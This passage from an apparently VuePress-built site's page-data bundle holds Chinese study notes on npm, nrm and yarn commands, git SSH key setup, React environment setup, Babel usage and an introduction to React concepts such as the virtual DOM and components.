秘钥",charIndex:1382},{level:3,title:"设置秘钥",slug:"设置秘钥",normalizedTitle:"设置秘钥",charIndex:1393},{level:3,title:"查看路径",slug:"查看路径",normalizedTitle:"查看路径",charIndex:1466},{level:3,title:"查看公钥",slug:"查看公钥",normalizedTitle:"查看公钥",charIndex:1487},{level:3,title:"新建config",slug:"新建config",normalizedTitle:"新建config",charIndex:1518},{level:2,title:"yarn 的使用",slug:"yarn-的使用",normalizedTitle:"yarn 的使用",charIndex:1662},{level:3,title:"yarn 的版本",slug:"yarn-的版本",normalizedTitle:"yarn 的版本",charIndex:1675},{level:3,title:"yarn 的安装",slug:"yarn-的安装",normalizedTitle:"yarn 的安装",charIndex:1705},{level:3,title:"初始化一个新项目",slug:"初始化一个新项目",normalizedTitle:"初始化一个新项目",charIndex:1741},{level:3,title:"添加依赖",slug:"添加依赖",normalizedTitle:"添加依赖",charIndex:1767},{level:3,title:"安装依赖的位置",slug:"安装依赖的位置",normalizedTitle:"安装依赖的位置",charIndex:1874},{level:3,title:"升级依赖",slug:"升级依赖",normalizedTitle:"升级依赖",charIndex:2025},{level:3,title:"安装包",slug:"安装包",normalizedTitle:"安装包",charIndex:2122},{level:3,title:"移除依赖包",slug:"移除依赖包",normalizedTitle:"移除依赖包",charIndex:2130}],headersStr:"一、镜像源链接切换 二、使用 nrm 切换镜像源 三，快速完全删除node_modules 四、npm -v :版本查询 五、安装依赖 其他指令 git 秘钥 设置秘钥 查看路径 查看公钥 新建config yarn 的使用 yarn 的版本 yarn 的安装 初始化一个新项目 添加依赖 安装依赖的位置 升级依赖 安装包 移除依赖包",content:"# Npm的常用命令\n\n\n# 一、镜像源链接切换\n\n全局切换镜像源：npm config set registry http://registry.npm.taobao.org\n查看镜像源使用状态：npm get registry\n全局切换官方镜像源：npm config set registry http://www.npmjs.org\n\n\n\n# 二、使用 nrm 切换镜像源\n\n下载 nrm：npm install -g nrm\n是否安装成功 nrm -V\n查看可切换的镜像源： nrm ls (*表示正在使用的镜像源)\n\n\n\n# 三，快速完全删除node_modules\n\nnpm install rimraf -g\nrimraf node_modules\n\n\n\n\n# 四、npm -v :版本查询\n\n\n# 五、安装依赖\n\nnpm install 包名 --save-dev(npm install 包名 -D) ：安装的包只用于开发环境，不用于生产环境\n\nnpm install 包名 --save (npm install 包名 -S)：安装的包需要发布到生产环境的\n\n\n\n\n# 其他指令\n\n安装/卸载\n全局安装/卸载\nnpm install ** -g\nnpm uninstall ** -g\nnpm un 同上，别名\n\nnpm update -g 更新全部包\n\n\nnpm list -g --depth 0 查看全局的包\n\n查看所有全局安装的模块 npm ls -g\n查看npm默认设置（部分） npm config ls\n查看npm默认设置（全部） npm config ls -l\n\n\n修改默认安装目录\nnpm config set prefix “D:\\ProgramFiles\\npm_global_modules\\node_modules”\n\n\nnpm-check检查更新\nnpm install -g npm-check\nnpm-check\n\nnpm-upgrade更新\nnpm install -g npm-upgrade\nnpm-upgrade\n\n更新生产环境依赖包：\nnpm update --save\n\n更新开发环境依赖包：\nnpm update --save-dev\n\nnpm link [<@scope>/][@] 将npm包创建快捷方式到全局npm的路径下\n\nnpm outdated 查看当前安装的包里版本是否过期的信息\n\nnpm deprecate [@] 添加对某个包的某个版本的反对信息。只有owner才可以，安装此包能看到这些反对信息\n\nnpm pack 将当前npm包文件打成一个压缩包\n\nnpm prune 移除没有定义在package.json 依赖配置上的包\n\n\nnpm adduser 添加用户\nnpm login 登陆用户\nnpm logout 退出当前登陆的npm账号\n\nnpm unpublish [<@scope>/][@] 取消发布包, 将发布的包从远程仓库中删除\nnpm publish [|] [–tag ] [–access <public|restricted>] 发布一个包\n\n查看当前npm包的依赖包列表\nnpm ls\nnpm list\nnpm la\nnpm ll\n\n\n\n\n\n# git 秘钥\n\n\n# 设置秘钥\n\nssh-keygen -t rsa -C '1963785622@qq.com' -f ~/.ssh/gub_id_rsa\n\n\n\n# 查看路径\n\nwhere git\n\n\n\n# 查看公钥\n\ncat gub_id_rsa.pub\n\n\n\n\n# 新建config\n\ntouch config\n\n\n#github\nHost github.com\nHostName github.com\nPreferredAuthentications publickey\nIdentityFile ~/.ssh/gub_id_rsa.pub\n\n\n\n# yarn 的使用\n\n\n# yarn 的版本\n\nyarn --version\n\n\n\n# yarn 的安装\n\nnpm install -g yarn\n\n\n\n\n# 初始化一个新项目\n\nyarn init\n\n\n\n\n# 添加依赖\n\nyarn add [package]\nyarn add [package]@[version]\nyarn add [package]@[tag]-（比如beta,next或者latest）\n\n\n\n\n# 安装依赖的位置\n\nyarn add [package] --dev  devDependencies\nyarn add [package] --peer  peerDependencies\nyarn add [package] --optional optionalDependencies\n\n\n\n# 升级依赖\n\nyarn upgrade [package]\nyarn upgrade [package]@[version]\nyarn upgrade [package]@[tag]\n\n\n\n\n# 安装包\n\n\n# 移除依赖包\n\nyarn remove [package]\n\n\n安装包：\nyarn install //安装package.json里所有包，并将包及它的所有依赖项保存进yarn.lock\nyarn install --flat //安装一个包的单一版本\nyarn install --force //强制重新下载所有包\nyarn install --production //只安装dependencies里的包\nyarn install --no-lockfile //不读取或生成yarn.lock\nyarn install --pure-lockfile //不生成yarn.lock\n\n",normalizedContent:"# npm的常用命令\n\n\n# 一、镜像源链接切换\n\n全局切换镜像源：npm config set registry http://registry.npm.taobao.org\n查看镜像源使用状态：npm get registry\n全局切换官方镜像源：npm config set registry http://www.npmjs.org\n\n\n\n# 二、使用 nrm 切换镜像源\n\n下载 nrm：npm install -g nrm\n是否安装成功 nrm -v\n查看可切换的镜像源： nrm ls (*表示正在使用的镜像源)\n\n\n\n# 三，快速完全删除node_modules\n\nnpm install rimraf -g\nrimraf node_modules\n\n\n\n\n# 四、npm -v :版本查询\n\n\n# 五、安装依赖\n\nnpm install 包名 --save-dev(npm install 包名 -d) ：安装的包只用于开发环境，不用于生产环境\n\nnpm install 包名 --save (npm install 包名 -s)：安装的包需要发布到生产环境的\n\n\n\n\n# 其他指令\n\n安装/卸载\n全局安装/卸载\nnpm install ** -g\nnpm uninstall ** -g\nnpm un 同上，别名\n\nnpm update -g 更新全部包\n\n\nnpm list -g --depth 0 查看全局的包\n\n查看所有全局安装的模块 npm ls -g\n查看npm默认设置（部分） npm config ls\n查看npm默认设置（全部） npm config ls -l\n\n\n修改默认安装目录\nnpm config set prefix “d:\\programfiles\\npm_global_modules\\node_modules”\n\n\nnpm-check检查更新\nnpm install -g npm-check\nnpm-check\n\nnpm-upgrade更新\nnpm install -g npm-upgrade\nnpm-upgrade\n\n更新生产环境依赖包：\nnpm update --save\n\n更新开发环境依赖包：\nnpm update --save-dev\n\nnpm link [<@scope>/][@] 将npm包创建快捷方式到全局npm的路径下\n\nnpm outdated 查看当前安装的包里版本是否过期的信息\n\nnpm deprecate [@] 添加对某个包的某个版本的反对信息。只有owner才可以，安装此包能看到这些反对信息\n\nnpm pack 将当前npm包文件打成一个压缩包\n\nnpm prune 移除没有定义在package.json 依赖配置上的包\n\n\nnpm adduser 添加用户\nnpm login 登陆用户\nnpm logout 退出当前登陆的npm账号\n\nnpm unpublish [<@scope>/][@] 取消发布包, 将发布的包从远程仓库中删除\nnpm publish [|] [–tag ] [–access <public|restricted>] 发布一个包\n\n查看当前npm包的依赖包列表\nnpm ls\nnpm list\nnpm la\nnpm ll\n\n\n\n\n\n# git 秘钥\n\n\n# 设置秘钥\n\nssh-keygen -t rsa -c '1963785622@qq.com' -f ~/.ssh/gub_id_rsa\n\n\n\n# 查看路径\n\nwhere git\n\n\n\n# 查看公钥\n\ncat gub_id_rsa.pub\n\n\n\n\n# 新建config\n\ntouch config\n\n\n#github\nhost github.com\nhostname github.com\npreferredauthentications publickey\nidentityfile ~/.ssh/gub_id_rsa.pub\n\n\n\n# yarn 的使用\n\n\n# yarn 的版本\n\nyarn --version\n\n\n\n# yarn 的安装\n\nnpm install -g yarn\n\n\n\n\n# 初始化一个新项目\n\nyarn init\n\n\n\n\n# 添加依赖\n\nyarn add [package]\nyarn add [package]@[version]\nyarn add [package]@[tag]-（比如beta,next或者latest）\n\n\n\n\n# 安装依赖的位置\n\nyarn add [package] --dev  devdependencies\nyarn add [package] --peer  peerdependencies\nyarn add [package] --optional optionaldependencies\n\n\n\n# 升级依赖\n\nyarn upgrade [package]\nyarn upgrade [package]@[version]\nyarn upgrade [package]@[tag]\n\n\n\n\n# 安装包\n\n\n# 移除依赖包\n\nyarn remove [package]\n\n\n安装包：\nyarn install //安装package.json里所有包，并将包及它的所有依赖项保存进yarn.lock\nyarn install --flat //安装一个包的单一版本\nyarn install --force //强制重新下载所有包\nyarn install --production //只安装dependencies里的包\nyarn install --no-lockfile //不读取或生成yarn.lock\nyarn install --pure-lockfile //不生成yarn.lock\n\n",charsets:{cjk:!0}},{title:"Home",frontmatter:{home:!0,heroImage:"/hero.jpg",heroText:"个人学习总结",tagline:"学习时的总结,便于查阅",features:[{title:"平时使用的学习文档"},{title:"努力学习"},{title:"早日买房"}]},regularPath:"/",relativePath:"README.md",key:"v-378a2ae2",path:"/",headersStr:null,content:"WARNING\n\n并没有什么很棒的知识点，一点知识总结而已",normalizedContent:"warning\n\n并没有什么很棒的知识点，一点知识总结而已",charsets:{cjk:!0}},{title:"React环境搭建",frontmatter:{},regularPath:"/React/React%E4%BB%8B%E7%BB%8D/React%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",relativePath:"React/React介绍/React环境搭建.md",key:"v-59ec66ce",path:"/React/React%E4%BB%8B%E7%BB%8D/React%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",headers:[{level:2,title:"浏览器直接引入",slug:"浏览器直接引入",normalizedTitle:"浏览器直接引入",charIndex:76},{level:3,title:"下载与安装React",slug:"下载与安装react",normalizedTitle:"下载与安装react",charIndex:157},{level:3,title:"React库文件",slug:"react库文件",normalizedTitle:"react库文件",charIndex:264},{level:3,title:"html模板示例",slug:"html模板示例",normalizedTitle:"html模板示例",charIndex:697}],headersStr:"浏览器直接引入 下载与安装React React库文件 html模板示例",content:'# React环境搭建\n\n当我们需要使用某种框架或库进行开发的时候，要先进行开发环境的搭建。\n\n创建一个React应用程序，通过如下两种方式：\n\n * 浏览器直接引入\n * 使用工具链构建React应用程序\n\n在前期的学习中，我们直接在浏览器引入react库，来降低学习的复杂度。\n\n\n# 浏览器直接引入\n\n\n# 下载与安装React\n\n下列两种方式，任选其一：\n\n列表         方式\ngitHub下载   点击进入github下载\nnpm安装      npm install react react-dom\n\n\n# React库文件\n\n库文件            作用                          版本   安装大小\nreact.js       是 React 的核心库                     \nreact-dom.js   是提供与 DOM 相关的功能                   \nbabel.js       是将 JSX 语法转为 JavaScript 语法        \n\n\x3c!-- head标签引入 --\x3e\n<script src="js/react.development.js"><\/script>\n<script src="js/react-dom.development.js"><\/script>\n\n\x3c!-- Babel 可以做很多很酷的事情，但是我们关心的是将 JSX 变成 JavaScript 的能力 --\x3e\n<script src="js/babel.min.js"><\/script>\n\n\n\n# html模板示例\n\n首先我们要下载React的核心资源库，我们可以从官方网站下载，其中包括很多Demo实例，还有React几个核心文件库。\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <script src="js/react.development.js"><\/script>\n    <script src="js/react-dom.development.js"><\/script>\n    <script src="https://unpkg.com/@babel/standalone/babel.min.js"><\/script>\n  </head>\n  <body>\n    <div id="example"></div>\n\n    \x3c!--要使用JSX语法进行开发需要将type制定为txt/babel --\x3e\n    <script type="text/babel">\n      // to do write some react code\n    <\/script>\n  </body>\n</html>\n',normalizedContent:'# react环境搭建\n\n当我们需要使用某种框架或库进行开发的时候，要先进行开发环境的搭建。\n\n创建一个react应用程序，通过如下两种方式：\n\n * 浏览器直接引入\n * 使用工具链构建react应用程序\n\n在前期的学习中，我们直接在浏览器引入react库，来降低学习的复杂度。\n\n\n# 浏览器直接引入\n\n\n# 下载与安装react\n\n下列两种方式，任选其一：\n\n列表         方式\ngithub下载   点击进入github下载\nnpm安装      npm install react react-dom\n\n\n# react库文件\n\n库文件            作用                          版本   安装大小\nreact.js       是 react 的核心库                     \nreact-dom.js   是提供与 dom 相关的功能                   \nbabel.js       是将 jsx 语法转为 javascript 语法        \n\n\x3c!-- head标签引入 --\x3e\n<script src="js/react.development.js"><\/script>\n<script src="js/react-dom.development.js"><\/script>\n\n\x3c!-- babel 可以做很多很酷的事情，但是我们关心的是将 jsx 变成 javascript 的能力 --\x3e\n<script src="js/babel.min.js"><\/script>\n\n\n\n# html模板示例\n\n首先我们要下载react的核心资源库，我们可以从官方网站下载，其中包括很多demo实例，还有react几个核心文件库。\n\n<!doctype html>\n<html>\n  <head>\n    <script src="js/react.development.js"><\/script>\n    <script src="js/react-dom.development.js"><\/script>\n    <script src="https://unpkg.com/@babel/standalone/babel.min.js"><\/script>\n  </head>\n  <body>\n    <div id="example"></div>\n\n    \x3c!--要使用jsx语法进行开发需要将type制定为txt/babel --\x3e\n    <script type="text/babel">\n      // to do write some react code\n    <\/script>\n  </body>\n</html>\n',charsets:{cjk:!0}},{title:"首页",frontmatter:{},regularPath:"/React/",relativePath:"React/README.md",key:"v-a26dfcc8",path:"/React/",headersStr:null,content:"----------------------------------------\n\n互联网技术发展一日千里，网页应用开发技术也不例外，自从jQuery问世以来，它就在网页开发领域占据统治地位，同时，还有许多MVC框架如雨后春笋般出现。但是业界也普遍发现，jQuery和各种MVC框架在开发大型复杂应用时，依然面临很多难以克服的困难。\n\n当2014年Facebook推出React时，给整个业界带来全新的看待网页应用开发的方式，和React一同问世的Flux，也克服传统MVC框架的很多弊病。技术在不断发展，在2015年，Flux的一个变体Redux出现，进一步优化了Flux的功能。\n\nReact和Redux的结合，让网页开发开启了新的篇章。",normalizedContent:"----------------------------------------\n\n互联网技术发展一日千里，网页应用开发技术也不例外，自从jquery问世以来，它就在网页开发领域占据统治地位，同时，还有许多mvc框架如雨后春笋般出现。但是业界也普遍发现，jquery和各种mvc框架在开发大型复杂应用时，依然面临很多难以克服的困难。\n\n当2014年facebook推出react时，给整个业界带来全新的看待网页应用开发的方式，和react一同问世的flux，也克服传统mvc框架的很多弊病。技术在不断发展，在2015年，flux的一个变体redux出现，进一步优化了flux的功能。\n\nreact和redux的结合，让网页开发开启了新的篇章。",charsets:{cjk:!0}},{title:"Babel",frontmatter:{},regularPath:"/React/React%E4%BB%8B%E7%BB%8D/Babel.html",relativePath:"React/React介绍/Babel.md",key:"v-b2cc8c62",path:"/React/React%E4%BB%8B%E7%BB%8D/Babel.html",headers:[{level:2,title:"Babel作用",slug:"babel作用",normalizedTitle:"babel作用",charIndex:373},{level:3,title:"编译下一代ECMAscript语法",slug:"编译下一代ecmascript语法",normalizedTitle:"编译下一代ecmascript语法",charIndex:385},{level:3,title:"JSX and React",slug:"jsx-and-react",normalizedTitle:"jsx and react",charIndex:468},{level:2,title:"Babel编译方式",slug:"babel编译方式",normalizedTitle:"babel编译方式",charIndex:578},{level:3,title:"客户端编译",slug:"客户端编译",normalizedTitle:"客户端编译",charIndex:600},{level:3,title:"命令行编译",slug:"命令行编译",normalizedTitle:"命令行编译",charIndex:680},{level:2,title:"基本使用",slug:"基本使用",normalizedTitle:"基本使用",charIndex:966},{level:3,title:"编译下一代JavaScript",slug:"编译下一代javascript",normalizedTitle:"编译下一代javascript",charIndex:975},{level:3,title:"编译JSX",slug:"编译jsx",normalizedTitle:"编译jsx",charIndex:1195},{level:3,title:"命令行语法",slug:"命令行语法",normalizedTitle:"命令行语法",charIndex:1405}],headersStr:"Babel作用 编译下一代ECMAscript语法 JSX and React Babel编译方式 客户端编译 命令行编译 基本使用 编译下一代JavaScript 编译JSX 命令行语法",content:'# Babel\n\n> Babel是一个Javascript编译器。\n\nBabel 是一个工具链，主要用于在旧的浏览器或环境中将 ECMAScript 2015+ 代码转换为向后兼容版本的 JavaScript 代码：\n\n * 转换语法\n * Polyfill 实现目标环境中缺少的功能 (通过 @babel/polyfill)\n * 源代码转换 (codemods)\n\n名称      作用                          版本   安装大小\nbabel   是将 JSX 语法转为 JavaScript 语法        \n\n名称             地址\nbabel官网 - 中文   https://babel.docschina.org/\nbabel官网 - 英文   http://babeljs.io\n\n\n# Babel作用\n\n\n# 编译下一代ECMAscript语法\n\nBabel 通过语法转换器支持最新版本的 JavaScript 。 这些插件允许你立刻使用新语法，无需等待浏览器支持。\n\n\n# JSX and React\n\nBabel内置支持JSX语法转换器，能够转换 JSX 语法并去除类型注释。\n\n当我们采用JSX语法进行开发，我们需要将这种语法编译为正常的JS语法,我们可以使用Babel进行编译。\n\n\n# Babel编译方式\n\n类别      描述\n客户端编译   我们需要引入babel的浏览器端编译库browser.js进行编译。采用这种方式需要在客户端进行编译为js文件。这种方式会造成浪费客户端资源。\n命令行编译   我们可以在开发时采用babel编译器把jsx编译为js。\n\n\n# 客户端编译\n\n引入babel客户端编译库babel.js\n\n<script src="babel.min.js"><\/script>\n<script src="https://unpkg.com/@babel/standalone/babel.min.js"><\/script>\n\n<script type="text/babel">\n//JSX\n...\n<\/script>\n\n\n\n# 命令行编译\n\n安装babel-cli\n\n$ npm install -g babel-cli\n\n\n\n# 基本使用\n\n\n# 编译下一代JavaScript\n\n在服务器端将使用新语法Javascript代码转换成 当前浏览器支持的Javascript需要使用Babel中一个插件@babel/preset-env\n\n安装@babel/preset-env\n\n$ npm install @babel/preset-env --save-dev\n\n\n创建.babelrc文件\n\n{\n  "presets": ["@babel/preset-env"]\n}\n\n\n\n\n# 编译JSX\n\n在服务器端将JSX 转换成 JS需要使用Babel中一个插件@babel/preset-react\n\n> 注意：此插件基于nodejs，请确保已安装nodejs。\n\n安装@babel/preset-react\n\n$ npm install @babel/preset-react\n\n\n创建.babelrc文件\n\n{\n  "presets": ["@babel/preset-react"]\n}\n\n\n\n\n# 命令行语法\n\n在命令行执行\n\n# --out-file or -o 输出到文件\n$ babel script.js --out-file script-compiled.js\n\n# --watch or -w 监测\n$ babel script.js --watch --out-file script-compiled.js\n\n# --out-dir 输出到文件夹\n$ babel src --out-dir lib\n\n\n参数    说明\nsrc   要编译的目录\nlib   编译成功后输出目录\n-o    输出文件\n-w    自动监测文件变化执行编译',normalizedContent:'# babel\n\n> babel是一个javascript编译器。\n\nbabel 是一个工具链，主要用于在旧的浏览器或环境中将 ecmascript 2015+ 代码转换为向后兼容版本的 javascript 代码：\n\n * 转换语法\n * polyfill 实现目标环境中缺少的功能 (通过 @babel/polyfill)\n * 源代码转换 (codemods)\n\n名称      作用                          版本   安装大小\nbabel   是将 jsx 语法转为 javascript 语法        \n\n名称             地址\nbabel官网 - 中文   https://babel.docschina.org/\nbabel官网 - 英文   http://babeljs.io\n\n\n# babel作用\n\n\n# 编译下一代ecmascript语法\n\nbabel 通过语法转换器支持最新版本的 javascript 。 这些插件允许你立刻使用新语法，无需等待浏览器支持。\n\n\n# jsx and react\n\nbabel内置支持jsx语法转换器，能够转换 jsx 语法并去除类型注释。\n\n当我们采用jsx语法进行开发，我们需要将这种语法编译为正常的js语法,我们可以使用babel进行编译。\n\n\n# babel编译方式\n\n类别      描述\n客户端编译   我们需要引入babel的浏览器端编译库browser.js进行编译。采用这种方式需要在客户端进行编译为js文件。这种方式会造成浪费客户端资源。\n命令行编译   我们可以在开发时采用babel编译器把jsx编译为js。\n\n\n# 客户端编译\n\n引入babel客户端编译库babel.js\n\n<script src="babel.min.js"><\/script>\n<script src="https://unpkg.com/@babel/standalone/babel.min.js"><\/script>\n\n<script type="text/babel">\n//jsx\n...\n<\/script>\n\n\n\n# 命令行编译\n\n安装babel-cli\n\n$ npm install -g babel-cli\n\n\n\n# 基本使用\n\n\n# 编译下一代javascript\n\n在服务器端将使用新语法javascript代码转换成 当前浏览器支持的javascript需要使用babel中一个插件@babel/preset-env\n\n安装@babel/preset-env\n\n$ npm install @babel/preset-env --save-dev\n\n\n创建.babelrc文件\n\n{\n  "presets": ["@babel/preset-env"]\n}\n\n\n\n\n# 编译jsx\n\n在服务器端将jsx 转换成 js需要使用babel中一个插件@babel/preset-react\n\n> 注意：此插件基于nodejs，请确保已安装nodejs。\n\n安装@babel/preset-react\n\n$ npm install @babel/preset-react\n\n\n创建.babelrc文件\n\n{\n  "presets": ["@babel/preset-react"]\n}\n\n\n\n\n# 命令行语法\n\n在命令行执行\n\n# --out-file or -o 输出到文件\n$ babel script.js --out-file script-compiled.js\n\n# --watch or -w 监测\n$ babel script.js --watch --out-file script-compiled.js\n\n# --out-dir 输出到文件夹\n$ babel src --out-dir lib\n\n\n参数    说明\nsrc   要编译的目录\nlib   编译成功后输出目录\n-o    输出文件\n-w    自动监测文件变化执行编译',charsets:{cjk:!0}},{title:"React简介",frontmatter:{},regularPath:"/React/React%E4%BB%8B%E7%BB%8D/React%E7%AE%80%E4%BB%8B.html",relativePath:"React/React介绍/React简介.md",key:"v-545eeac7",path:"/React/React%E4%BB%8B%E7%BB%8D/React%E7%AE%80%E4%BB%8B.html",headers:[{level:2,title:"React是什么",slug:"react是什么",normalizedTitle:"react是什么",charIndex:295},{level:2,title:"由谁开发",slug:"由谁开发",normalizedTitle:"由谁开发",charIndex:379},{level:3,title:"组件化思想",slug:"组件化思想",normalizedTitle:"组件化思想",charIndex:506},{level:3,title:"以 JavaScript 为中心",slug:"以-javascript-为中心",normalizedTitle:"以 javascript 为中心",charIndex:580},{level:2,title:"为什么需要React",slug:"为什么需要react",normalizedTitle:"为什么需要react",charIndex:647},{level:2,title:"React解决问题",slug:"react解决问题",normalizedTitle:"react解决问题",charIndex:1115},{level:2,title:"React设计哲学",slug:"react设计哲学",normalizedTitle:"react设计哲学",charIndex:1900},{level:2,title:"React特点",slug:"react特点",normalizedTitle:"react特点",charIndex:2063},{level:2,title:"Virtual DOM",slug:"virtual-dom",normalizedTitle:"virtual dom",charIndex:2119},{level:3,title:"直接操作DOM",slug:"直接操作dom",normalizedTitle:"直接操作dom",charIndex:1058},{level:3,title:"Virtual DOM",slug:"virtual-dom-2",normalizedTitle:"virtual dom",charIndex:2119},{level:2,title:"React组件化",slug:"react组件化",normalizedTitle:"react组件化",charIndex:2984},{level:2,title:"浏览器支持",slug:"浏览器支持",normalizedTitle:"浏览器支持",charIndex:3443},{level:2,title:"附录",slug:"附录",normalizedTitle:"附录",charIndex:3666},{level:3,title:"[1]什么是声明式编程",slug:"_1-什么是声明式编程",normalizedTitle:"[1]什么是声明式编程",charIndex:3673},{level:3,title:"声明式编程 vs 命令式编程",slug:"声明式编程-vs-命令式编程",normalizedTitle:"声明式编程 vs 命令式编程",charIndex:3925},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:4024}],headersStr:"React是什么 由谁开发 组件化思想 以 JavaScript 为中心 为什么需要React React解决问题 React设计哲学 React特点 Virtual DOM 直接操作DOM Virtual DOM React组件化 浏览器支持 附录 [1]什么是声明式编程 声明式编程 vs 命令式编程 参考",content:'# React简介\n\n> React是Facebook开发的一款用于构建用户界面的JavaScript库。\n\n名称            地址\nReact官网       https://reactjs.org/\nReact官网中文     https://zh-hans.reactjs.org/\nReact中文文档     https://zh-hans.reactjs.org/docs/getting-started.html\nReact版本更新历史   https://github.com/facebook/react/blob/master/CHANGELOG.md\n\n\n# React是什么\n\nReact是Facebook开发的一款用于构建用户界面的JavaScript库。所有的React应用的核心是 组件(Component)。\n\n\n# 由谁开发\n\n * 起初由Facebook 的软件工程师 Jordan Walke 创建。\n\n * 于2011年部署于Facebook 的 newsfeed\n\n * 随后在2012年部署于Instargram\n\n * 2013年5月开源。 ...\n\n\n# 组件化思想\n\nReact 的一个重要贡献——将基于组件的架构带到前端世界，React 并不是“组件”的发明者，但它的确在这领域深凿了一步。\n\n\n# 以 JavaScript 为中心\n\nReact 将 "HTML" 嵌入 JS。用Javascript语法去操作"HTML"。\n\n\n# 为什么需要React\n\nFacebook认为MVC无法满足他们的扩展需求，由于他们非常巨大的代码库和庞大的组织，使得MVC很快变得非常复复杂，每当需要添加一项新的功能或特性时，系统的复杂度就成级数增长，致使代码变得脆弱和不可预测，结果导致他们的MVC正在土崩瓦解。便认为MVC不适合大规模应用，当系统中有很多的模型和相应的视图时，其复杂度就会迅速扩大，非常难以理解和调试，特别是模型和视图间可能存在的双向数据流动。\n\n解决这个问题需要“以某种方式组织代码，使其更加可预测”，Flux和React做到了这一点。Flux是一种促进应用内数据单向流动的系统架构。据Occhino介绍，React是一种用来构建“可控”和“声明式”的web用户接口的JavaScript框架，使得Facebook可以更快的开发web应用。\n\n原生JavaScript 操作Dom频繁，效率低。（DOM-API操作UI）\n\n使用JavaScript 直接操作DOM ，浏览器会大量的重绘重排。\n\n原生JavaScript 没有组件化编码方案，代码复用低。\n\n\n# React解决问题\n\n前端开发变得越来越复杂，其本质问题可归结于如何将来自于服务器端或者用户输入的动态数据高效的反映到复杂的用户界面上。\n\n\n                         现阶段问题          React解决方案\n                        ┌──────────┐      ┌──────────┐\n                        │          │      │          │\n                     ┌──┤频繁DOM操作├──────┤自动DOM操作│\n   ┌──────────┐      │  │          │      │          │\n   │          │      │  └──────────┘      └──────────┘\n   │DataChange├──────┤   \n   │          │      │  ┌──────────┐      ┌──────────┐\n   └──────────┘      │  │          │      │          │\n                     └──┤逻辑极复杂 ├──────┤ 状态&属性 │\n                        │          │      │          │\n                        └──────────┘      └──────────┘\n\n\n\n采用组件化模式，声明式编码，提高开发效率及组件复用率。\n\nReact Native 编写原生应用 移动端开发。\n\n高效（优秀的Diffing算法 使用虚拟DOM）避免于真实Dom 接触。\n\n\n# React设计哲学\n\n从设计哲学来讲，React 的整个设计思想其实非常简单：\n\n                  data  -> view\nconst Component = props => ReactElement\n\n\n再概括一下就是：\n\ndata => view\n\n\n> 简而言之就是：数据到视图的映射。\n\n\n# React特点\n\n 1. 声明式设计[1]：自动DOM操作(React自动完成)\n\n * 高效：通过虚拟DOM(Virtual DOM)，最大限度的减少与DOM的交互提高效率\n * 灵活：可以与已知的框架或库很好的配合\n * JSX：JavaScript语法的扩展，可以不使用，但建议使用\n * 组件：构建组件，使代码更容易得到复用，能够很好地应用在大项目的开发中\n * 单向数据流：React实现了单向响应的数据流，从而减少了重复代码，使得比传统数据绑定更简单\n\n\n# Virtual DOM\n\n> React 使用 Virtual DOM 来更新真正的 DOM，从而提高效率和速度。\n\n在Web开发中，我们总需要将变化的数据实时展示到视图上，这时就需要对DOM进行操作，而复杂或频繁的DOM操作通常是性能瓶颈产生的原因（如何进行高性能的复杂DOM操作通常是衡量一个前端开发人员技能的重要指标）。\n\nReact为此引入了虚拟DOM（Virtual DOM）的机制：在浏览器端用Javascript实现了一套DOM API。因为 DOM 操作是真的很慢，所以我们永远不会直接用 React 修改 DOM，而是修改内存中的虚拟 DOM。\n\n\n# 直接操作DOM\n\n真实页面对应一个 DOM 树。在传统页面的开发模式中，每次需要更新页面时，都要手动操作 DOM 来进行更新\n\nDOM 操作非常昂贵。我们都知道在前端开发中，性能消耗最大的就是 DOM 操作，而且这 部分代码会让整体项目的代码变得难以维护。React 把真实 DOM 树转换成 JavaScript 对象树，也 就是 Virtual DOM\n\n\n# Virtual DOM\n\n操作虚拟 DOM 非常快，当时机合适时，React 负责更新真实 DOM。它通过比较虚拟 DOM 和真实 DOM 之间的差别，查明哪个改变很重要，然后在一个称为 Reconciliation 的过程中作出最少量的 DOM 改变，以确保一切保持最新。\n\n> 简单说， 每次数据更新后，重新计算 Virtual DOM，并和上一次生成的 Virtual DOM 做对比，对发生 变化的部分做批量更新。\n\n\n# React组件化\n\n> 创建好拥有各自状态的组件，再由组件构成更加复杂的界面。\n\nComponent，中文成为 组件 即将实现页面某一部分功能的结构、样式和逻辑封装成为一个整体，使其高内聚，低耦合，达到分治与复用的目的。组件化设计的目的是提高代码的复用，降低测试难度，代码复杂度。\n\n组件 是React中构建用户界面的基本单位。组件化的工作方式信奉独立、完整、自由组合。目标就是尽可能把设计与开发中的元素独立化，使它具备完整的局部功能，通过自由组合来构成整个产品。\n\nReact 鼓励我们将视觉元素分为更小的组件，而不是一整大块：\n\nReact认为一个组件应该具有如下特征：\n\n * 可组合（Composeable）：一个组件易于和其它组件一起使用，或者嵌套在另一个组件内部，一个复杂的UI可以拆分成多个简单的UI组件；\n * 可重用（Reusable）：每个组件都是具有独立功能的，它可以被使用在多个UI场景；\n * 可维护（Maintainable）：每个小的组件仅仅包含自身的逻辑，更容易被理解和维护；\n\n\n# 浏览器支持\n\nReact 支持所有的现代浏览器，包括 IE9 及以上版本，但是需要为旧版浏览器比如 IE9 和 IE10 引入相关的 polyfills 赖依。\n\nReact 16 依赖集合类型 Map 和 Set 。如果你要支持无法原生提供这些能力（例如 IE < 11）或实现不规范（例如 IE 11）的旧浏览器与设备，考虑在你的应用库中包含一个全局的 polyfill ，例如 core-js 或 babel-polyfill 。\n\n\n# 附录\n\n\n# [1]什么是声明式编程\n\n声明式编程是一种编程范式，它关注的是你要做什么，而不是如何做。它表达逻辑而不显式地定义步骤。这意味着我们需要根据逻辑的计算来声明要显示的组件。它没有描述控制流步骤。声明式编程的例子有HTML、SQL等\n\nHTML file\n\n// HTML\n<div>\n  <p>Declarative Programming</p>\n</div>\n\n\nSQL file\n\nselect * from studens where firstName = \'declarative\';\n\n\n\n# 声明式编程 vs 命令式编程\n\n声明式编程的编写方式描述了应该做什么，而命令式编程描述了如何做。在声明式编程中，让编译器决定如何做事情。声明性程序很容易推理，因为代码本身描述了它在做什么。\n\n\n# 参考\n\n * https://juejin.im/post/5cf0733de51d4510803ce34e#heading-9\n * https://www.optbbs.com/thread-2050391-1-1.html',normalizedContent:'# react简介\n\n> react是facebook开发的一款用于构建用户界面的javascript库。\n\n名称            地址\nreact官网       https://reactjs.org/\nreact官网中文     https://zh-hans.reactjs.org/\nreact中文文档     https://zh-hans.reactjs.org/docs/getting-started.html\nreact版本更新历史   